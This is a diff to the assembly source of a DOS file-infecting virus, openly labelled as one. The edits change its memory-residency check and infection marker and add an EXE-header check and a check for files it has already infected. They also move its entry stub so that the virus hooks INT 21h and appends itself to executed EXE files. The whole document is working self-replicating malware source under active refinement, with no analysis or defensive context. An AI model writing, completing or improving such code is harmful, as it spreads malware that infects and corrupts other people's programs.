@@ -23,8 +23,9 @@
 
 VirusSize	equ	EndVirus-BeginVirus
 ParagraphSize	equ	(VirusSize+15)/16
-VirusInterrupt	equ	0d7h				; Our interrupt
-VirusIdentifier	equ	0fed8h				; Our identifier
+VirusInterrupt	equ	7979h
+VirusHandshake	equ	'JG'
+ExeMarker	equ	'JG'
 
 ;---------------------------------------------------------------------
 ;	The virus begins here
@@ -32,16 +33,6 @@ VirusIdentifier	equ	0fed8h				; Our identifier
 
 BeginVirus:
 	jmp	EntryPoint
-
-EntryPoint:
-	push	ax
-	pop	ax
-	push	ax
-	pop	ax
-	call	@@delta
-@@delta:	pop	bp
-	sub	bp, offset @@delta
-	jmp	BeginNonEncryptedSection
 
 BeginNonEncryptedSection:
 	mov	ax, es
@@ -56,11 +47,11 @@ BeginNonEncryptedSection:
 	pop	ds
 
 	cld
-	mov	ah, VirusInterrupt			; Are we installed?
+	mov	ax, VirusInterrupt			; Are we installed?
 	jmp	@@next
 @@next:	int	21h
 	jc	InstallVirus				; Not there
-	cmp	ax, VirusIdentifier			; Check again...
+	cmp	ax, VirusHandshake			; Check again...
 	jne	InstallVirus
 	jmp	ExitVirus				; Exit program...
 
@@ -115,9 +106,9 @@ ExeHead	db	22 dup (0)
 ;---------------------------------------------------------------------
 
 Int21hHandler:
-	cmp	ah, VirusInterrupt			; Is it our call?
+	cmp	ax, VirusInterrupt			; Is it our call?
 	jne	@@next
-	mov	ax, VirusIdentifier			; Tell 'em we're here
+	mov	ax, VirusHandshake			; Tell 'em we're here
 	iret						; Jump back...
 @@next:	cmp	ax, 4b00h				; File executed?
 	jne	OldInt21h
@@ -169,6 +160,15 @@ InfectExeFile:
 	mov	dx, offset ExeHead-100h
 	int	21h
 
+	cmp	word ptr ds:[ExeHead-100h], 'ZM'	; Check if .EXE file
+	je	@@check_infected
+	cmp	word ptr ds:[ExeHead-100h], 'MZ'
+	jne	CloseFile
+
+@@check_infected:
+	cmp	word ptr ds:[ExeHead-100h+12h], ExeMarker	; Already infected?
+	je	CloseFile
+
 	mov	ax, 4202h				; Go EOF
 	xor	cx, cx
 	xor	dx, dx
@@ -199,9 +199,10 @@ InfectExeFile:
 	mov	cx, 16
 	div	cx
 	sub	ax, word ptr ds:[ExeHead-100h+8h]
+	add	dx, offset EntryPoint-BeginVirus
 	mov	word ptr ds:[ExeHead-100h+16h], ax
 	mov	word ptr ds:[ExeHead-100h+14h], dx
-	mov	word ptr ds:[ExeHead-100h+12h], 'RI'
+	mov	word ptr ds:[ExeHead-100h+12h], ExeMarker
 
 	mov	ax, 4200h				; Position file-pointer to BOF
 	xor	cx, cx
@@ -238,6 +239,16 @@ CloseFile:
 
 ExeTime	dw	0
 ExeDate	dw	0
+
+EntryPoint:
+	push	ax
+	pop	ax
+	push	ax
+	pop	ax
+	call	@@delta
+@@delta:	pop	bp
+	sub	bp, offset @@delta
+	jmp	BeginNonEncryptedSection
 
 EndVirus:
 
